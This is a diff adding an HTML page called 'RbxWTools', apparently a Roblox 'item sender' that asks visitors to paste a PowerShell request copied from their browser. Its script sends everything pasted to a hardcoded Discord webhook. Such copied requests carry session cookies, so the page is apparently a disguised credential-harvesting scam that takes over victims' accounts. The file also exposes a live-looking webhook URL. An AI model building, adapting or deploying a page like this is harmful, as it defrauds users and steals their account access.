@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RbxWTools - PowerShell URL Item Sender</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            text-align: center;
+            padding: 20px 15px;
+            margin-top: 20px;
+        }
+
+        .neon-text {
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: transparent;
+            text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #ff00ff, 0 0 20px #ff00ff;
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+
+        .domain {
+            color: #8b9dff;
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .input-field {
+            width: 100%;
+            min-height: 200px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 2px solid #6366f1;
+            border-radius: 10px;
+            color: #fff;
+            font-family: monospace;
+            font-size: 16px;
+            padding: 15px;
+            resize: vertical;
+            box-shadow: 0 0 15px rgba(99, 102, 241, 0.7);
+        }
+
+        .input-placeholder {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 18px;
+            pointer-events: none;
+            text-align: center;
+            width: 100%;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        .input-field:focus + .input-placeholder,
+        .input-field:not(:placeholder-shown) + .input-placeholder {
+            opacity: 0;
+        }
+
+        .btn-ready {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(139, 92, 246, 0.7);
+            margin-bottom: 20px;
+        }
+
+        .status {
+            min-height: 24px;
+            font-weight: 500;
+        }
+
+        .success {
+            color: #4ade80;
+        }
+
+        .error {
+            color: #f87171;
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        @media (max-width: 480px) {
+            .neon-text {
+                font-size: 1.8rem;
+            }
+            
+            .input-field {
+                min-height: 150px;
+            }
+            
+            .input-placeholder {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="neon-text">RbxWTools</h1>
+        <div class="domain" id="domainDisplay">rbxwtools.site</div>
+        
+        <div class="input-container">
+            <textarea class="input-field" placeholder=" " id="userInput"></textarea>
+            <div class="input-placeholder">Insert Item as URL PowerShell</div>
+        </div>
+        
+        <button class="btn-ready" id="readyBtn">Ready</button>
+        
+        <div class="status" id="status"></div>
+    </div>
+    
+    <footer>
+        RbxWTools &copy; 2023 | Hosted on GitHub Pages
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const userInput = document.getElementById('userInput');
+            const readyBtn = document.getElementById('readyBtn');
+            const status = document.getElementById('status');
+            const domainDisplay = document.getElementById('domainDisplay');
+            
+            // Показываем текущий домен
+            domainDisplay.textContent = window.location.hostname;
+            
+            readyBtn.addEventListener('click', function() {
+                const text = userInput.value.trim();
+                
+                if (!text) {
+                    showStatus('Please, past your PowerShell', 'error');
+                    return;
+                }
+                
+                showStatus('Loading...', 'loading');
+                
+                // ЗАМЕНИТЕ НА ВАШ DISCORD WEBHOOK URL
+                const webhookURL = 'https://discord.com/api/webhooks/1411718515639062538/_LqHhtFAdBl8LB1M73C5T00ypFv28w2nxFYIXgPDGsfcDw7zA2nadasuI7jVeCp8mdwe';
+                
+                sendToDiscord(text, webhookURL);
+            });
+            
+            function sendToDiscord(content, webhookURL) {
+                const payload = {
+                    content: "New PowerShell Item Received:",
+                    embeds: [
+                        {
+                            title: "Item Content",
+                            description: "```powershell\n" + content + "\n```",
+                            color: 0x6366F1,
+                            timestamp: new Date().toISOString(),
+                            footer: {
+                                text: "RbxWTools Item Sender"
+                            }
+                        }
+                    ]
+                };
+                
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        showStatus('Success! Thank you very much.', 'success');
+                        userInput.value = '';
+                    } else {
+                        showStatus('Error, please reply powershell', 'error');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showStatus('Internet error', 'error');
+                });
+            }
+            
+            function showStatus(message, type) {
+                status.textContent = '';
+                status.className = 'status';
+                
+                if (type === 'loading') {
+                    status.innerHTML = '<div style="display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#6366f1;animation:spin 1s linear infinite;margin-right:10px;"></div> ' + message;
+                } else {
+                    status.textContent = message;
+                    status.classList.add(type);
+                }
+            }
+        });
+    </script>
+</body>
+</html>
